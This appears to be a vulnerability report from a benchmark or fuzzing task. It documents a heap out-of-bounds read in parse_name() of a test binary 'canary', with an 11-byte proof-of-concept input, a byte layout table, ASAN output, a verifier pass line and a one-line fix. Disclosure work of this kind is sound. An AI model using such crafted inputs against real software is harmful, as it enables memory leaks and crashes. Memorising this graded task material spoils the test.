## Summary

`parse_name()` reads a single attacker-controlled length byte (`name_len`) from the entry payload and passes it directly to `memcpy()` without validating it against the payload's actual allocation size or the declared entry length. With a 2-byte payload allocation and `name_len = 0xFF`, this reads up to 254 bytes past the end of the heap buffer, leaking adjacent heap contents (or crashing).

- **Binary:** `/target/bin/canary`
- **Source:** `/target/src/canary.c`
- **Function:** `parse_name`
- **Sink line:** `canary.c:45` (`memcpy`)
- **Allocation line:** `canary.c:138` (`parse_input`)
- **Severity:** High (heap OOB read, attacker-controlled length up to 255, useful as an info-leak primitive against secrets / heap metadata / ASLR-relevant pointers)

## Vulnerable code (paraphrased)

```c
// parse_name (canary.c ~line 40-46)
if (e->length < 2) return -1;
uint8_t name_len = e->payload[0];
// no check that name_len <= e->length - 1, nor against allocation size
memcpy(e->name, e->payload + 1, name_len);   // canary.c:45
```

The payload buffer is allocated in `parse_input` at line 138 with size derived from the declared entry length (here 2 bytes), but `name_len` (a separate byte from the payload) can be up to 255.

## Reproduction

```bash
printf '\x43\x4e\x52\x59\x01\x01\x01\x02\x00\xff\x00' > /tmp/poc2.bin
/target/bin/canary /tmp/poc2.bin
```

11-byte PoC layout:

| Offset | Bytes         | Meaning                       |
|--------|---------------|-------------------------------|
| 0      | `43 4E 52 59` | magic "CNRY"                  |
| 4      | `01`          | version = 1                   |
| 5      | `01`          | entry_count = 1               |
| 6      | `01`          | entry type = 1 (name)         |
| 7      | `02 00`       | entry length = 2 (LE)         |
| 9      | `ff`          | payload[0] = name_len = 0xFF  |
| 10     | `00`          | payload[1]                    |

## ASAN output (key lines)

```
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000032
READ of size 255 at 0x502000000032 thread T0
    #1 memcpy bits/string_fortified.h:29
    #2 parse_name /target/src/canary.c:45
    #3 process_entries /target/src/canary.c:57
    #4 parse_input /target/src/canary.c:150
    #5 main /target/src/canary.c:184
0x502000000032 is located 0 bytes to the right of 2-byte region
allocated by thread T0 here:
    #1 parse_input /target/src/canary.c:138
```

## Verification

Reproduces 3/3 runs with identical stack trace and allocation site. Verifier verdict: 5/5 PASS.

## Suggested fix

Validate `name_len` before `memcpy`:

```c
if (name_len > e->length - 1) return -1;
```

or, more defensively, also bound it by the declared `name` field size.
